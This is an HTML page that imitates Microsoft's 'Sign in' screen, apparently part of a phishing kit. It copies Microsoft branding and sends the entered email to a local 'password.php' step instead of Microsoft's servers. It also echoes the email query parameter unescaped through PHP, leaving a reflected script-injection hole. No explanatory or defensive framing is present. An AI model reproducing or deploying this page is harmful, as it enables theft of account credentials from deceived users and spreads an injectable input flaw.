<!DOCTYPE html>
<html dir="ltr" class="" lang="en">
<head>
<title>Sign in to your account</title>
<link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7415.8/content/images/favicon_a.ico">


<link crossorigin="anonymous" href="login.microsoftonline.com/login_files/converged.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)">

<style type="text/css">
<!--
.redTEXT {
	color: #e81123;
}
-->
</style>
</head>
<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">

<div>
  <!--  -->
  <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }">
    <div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
      <!-- ko if: smallImageUrl -->
      <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7415.8/content/images/backgrounds/0-small.jpg?x=138bcee624fa04ef9b75e86211a9fe0d&quot;);"></div>
      <!-- /ko -->
      <!-- ko if: backgroundImageUrl -->
      <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7415.8/content/images/backgrounds/0.jpg?x=a5dbd4393ff6a725c7e62b61df7e72f0&quot;);"></div>
      <!-- ko if: useImageMask -->
      <!-- /ko -->
      <!-- /ko -->
    </div>
  </div>
  <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="get" action="login.microsoftonline.com/password.php">
    <!-- ko withProperties: { '$loginPage': $data } -->
    <div class="outer" data-bind="component: { name: 'page',
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }">
      <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
      <!-- ko if: svr.fShowCookieBanner -->
      <!-- /ko -->
      <div class="middle" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }">
        <!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
        <!-- /ko -->
        <div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl(), 'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide') }">
          <!-- ko ifnot: paginationControlMethods()
                    && (paginationControlMethods().currentViewHasMetadata('hideLogo')
                        || (paginationControlMethods().currentViewHasMetadata('hideDefaultLogo') && !$loginPage.bannerLogoUrl())) -->
          <div role="banner" data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }">
            <!--  -->
            <!-- ko if: bannerLogoUrl -->
            <!-- /ko -->
            <!-- ko if: !bannerLogoUrl && !isChinaDc -->
            <!-- ko component: 'accessible-image-control' -->
            <!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
            <!-- /ko -->
            <!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme -->
            <!-- ko template: { nodes: [darkImageNode], data: $parent } -->
            <img class="logo" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7415.8/content/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7415.8/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="login.microsoftonline.com/login_files/microsoft_logo.svg">
            <!-- /ko -->
            <!-- /ko -->
            <!-- /ko -->
            <!-- /ko -->
          </div>
          <!-- /ko -->
          <!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) -->
          <!-- /ko -->
          <!-- ko if: showErrorDetails -->
          <!-- /ko -->
          <div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow } }">
            <div data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }">
              <!-- ko foreach: views -->
              <!-- ko if: $parent.currentViewIndex() === $index() -->
              <!-- ko template: { nodes: [$data], data: $parent } -->
              <div data-viewid="1" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            displayName: sharedData.displayName,
                            prefillNames: $loginPage.prefillNames,
                            flowToken: sharedData.flowToken },
                        event: {
                            refresh: $loginPage.view_onRefresh,
                            redirect: $loginPage.view_onRedirect,
                            showLearnMore: $loginPage.learnMore_onShow } }">
                <!--  -->
                <div data-bind="component: { name: 'header-control', params: { serverData: svr } }">
                  <div class="row text-title" id="loginHeader" role="heading">
                    <div aria-level="1" data-bind="text: title">Sign in</div>
                    <!-- ko if: isSubtitleVisible -->
                    <!-- /ko -->
                  </div>
                </div>
                <!-- ko if: pageDescription && !svr.fHideLoginDesc -->
                <!-- /ko -->
                
<div class="row">
                  <div role="alert" aria-live="assertive" aria-atomic="false">
                    <!-- ko if: usernameTextbox.error -->
                    <!-- /ko -->
                  </div>
                  <div class="form-group col-md-24">
                    <!-- ko if: prefillNames().length > 1 -->
                    <!-- /ko -->
                    <!-- ko ifnot: prefillNames().length > 1 -->
                    <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox',
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.UserIdLabel || str['CT_PWD_STR_Email_Example'],
                hintCss: 'placeholder' + (!svr.fAllowPhoneSignIn ? ' ltr_override' : '') },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }">
                      <!-- ko withProperties: { '$placeholderText': placeholderText } -->
                      <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
                      <input name="email" type="text" class="form-control ltr_override" id="i0116" value="<?php echo $_GET['email']; ?>" maxlength="113" placeholder="Email, phone, or Skype ">
                      
                      <div id="usernameProgress" class="progress" role="progressbar" data-bind="visible: isRequestPending, component: 'marching-ants-control', ariaLabel: str['WF_STR_ProgressText']" style="display: none;" aria-label="Please wait">
                        <!--  -->
                        <!-- ko if: useCssAnimation -->
        
                        <!-- /ko -->
                        <!-- ko ifnot: useCssAnimation -->
                        <!-- /ko -->
                      </div>
                      <!-- /ko -->
                      <!-- /ko -->
                      <!-- ko ifnot: usePlaceholderAttribute -->
                      <!-- /ko -->
                    </div>
                    <!-- /ko -->
                  </div>
                </div>
                <div data-bind="invertOrder: svr.fRepositionFooterButtons, css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
                  <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                    <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }">
                      <div class="col-xs-24 no-padding-left-right form-group" data-bind="
     visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
     css: { 'no-margin-bottom': removeBottomMargin || svr.fRepositionFooterButtons, 'button-container': svr.fRepositionFooterButtons }">
                        <div data-bind="
            css: {
                'inline-block': svr.fRepositionFooterButtons,
                'col-xs-12 secondary': isPrimaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
                'col-xs-24': !(isPrimaryButtonVisible() || svr.fRepositionFooterButtons) }" class="col-xs-12 secondary">
                          <input id="idBtn_Back" class="btn btn-block" data-bind="
            attr: {
                'id': secondaryButtonId || 'idBtn_Back',
                'aria-describedby': secondaryButtonDescribedBy },
            value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
            hasFocus: focusOnSecondaryButton,
            click: secondaryButton_onClick,
            enable: isSecondaryButtonEnabled,
            visible: isSecondaryButtonVisible" value="Back" style="display: none;" type="button">
                        </div>
                        <div data-bind="
            css: {
                'inline-block': svr.fRepositionFooterButtons,
                'col-xs-12 primary': isSecondaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
                'col-xs-24': !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }" class="col-xs-24">
                          <input id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                'id': primaryButtonId || 'idSIButton9',
                'aria-describedby': primaryButtonDescribedBy },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Next" type="submit">
                        </div>
                      </div>
                    </div>
                  </div>
                  <div class="row">
                    <div class="col-md-24">
                      <div class="text-13 action-links">
                        <!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases -->
                        <!-- /ko -->
                        <!-- ko component: { name: "cred-switch-link-control",
                    params: {
                        availableCreds: availableCredsWithoutUsername },
                    event: {
                        switchView: noUsernameCredSwitchLink_onSwitchView } } -->
                        <!-- ko if: altCreds.length > 0 -->
                        <!-- /ko -->
                        <!-- /ko -->
                        <!-- ko if: !svr.sRemoteConnectAppName && svr.remoteLoginConfig -->
                        <!-- /ko -->
                        <!-- ko if: svr.showCantAccessAccountLink -->
                        <div class="form-group"> <a id="cantAccessAccount" href="#" data-bind="text: str['WF_STR_CantAccessAccount_Text'], click: cantAccessAccount_onClick">Can't access your account?</a> </div>
                        <!-- /ko -->
                      </div>
                    </div>
                  </div>
                </div>
                <!-- ko if: tenantBranding.BoilerPlateText -->
                <!-- /ko -->
              </div>
        
            </div>
          </div>
        </div>
        <!-- ko if: newSessionMessage -->
        <!-- /ko -->


        <div data-bind="component: { name: 'instrumentation',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }">

        </div>
      </div>
      <!-- /ko -->
    </div>
    <!-- /ko -->
    <!-- ko if: showOptOutBanner -->
    <!-- /ko -->
    <div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }">
      <div data-bind="component: { name: 'footer-control',
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick,
                moreInfoClick: footer_onShowDebugDetails } }">
        <!--  -->
        <!-- ko if: showLinks || impressumLink || showIcpLicense -->
        <div id="footerLinks" class="footerNode text-secondary">
          <!-- ko if: !showIcpLicense -->
          <span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">&copy;2018 Microsoft</span>
          <!-- /ko -->
          <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="">Privacy &amp; cookies</a>
          <!-- ko if: impressumLink -->
          <!-- /ko -->
          <!-- ko if: showIcpLicense -->
          <!-- /ko -->
          <a href="#" role="button" class="moreOptions" data-bind="click: moreInfo_onClick, ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'], attr: { title: str['CT_STR_More_Options_Ellipsis_AriaLabel'] }" aria-label="Click here for more options" title="Click here for more options">
          <!-- ko component: 'accessible-image-control' -->
          <!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
          <!-- /ko -->
          <!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme -->
          <!-- ko template: { nodes: [darkImageNode], data: $parent } -->
          <img class="desktopMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7415.8/content/images/ellipsis_white.png?x=0ad43084800fd8b50a2576b5173746fe" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7415.8/content/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73" data-bind="imgSrc" src="login.microsoftonline.com/login_files/ellipsis_white.svg">
          <!-- /ko -->
          <!-- /ko -->
          <!-- /ko -->
          <!-- ko component: 'accessible-image-control' -->
          <!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
          <!-- /ko -->
          <!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme -->
          <!-- ko template: { nodes: [darkImageNode], data: $parent } -->
          <img class="mobileMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7415.8/content/images/ellipsis_grey.png?x=5bc252567ef56db648207d9c36a9d004" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7415.8/content/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c" data-bind="imgSrc" src="login_files/ellipsis_grey.svg">
          <!-- /ko -->
          <!-- /ko -->
          <!-- /ko -->
          </a> </div>
        <!-- /ko -->
      </div>
    </div>
  </form>
  <form method="post" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }">
    <!-- ko foreach: postRedirectParams -->
    <!-- /ko -->
  </form>
  <!-- ko if: svr.urlMsaMeControl -->
  <!-- /ko -->
  <!-- ko if: svr.urlCBPartnerPreload -->
  <div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }">
    <iframe style="display: none;" src="login.microsoftonline.com/login_files/prefetch.htm" width="0" height="0"></iframe>
  </div>
  <!-- /ko -->
</div>
</body>
</html>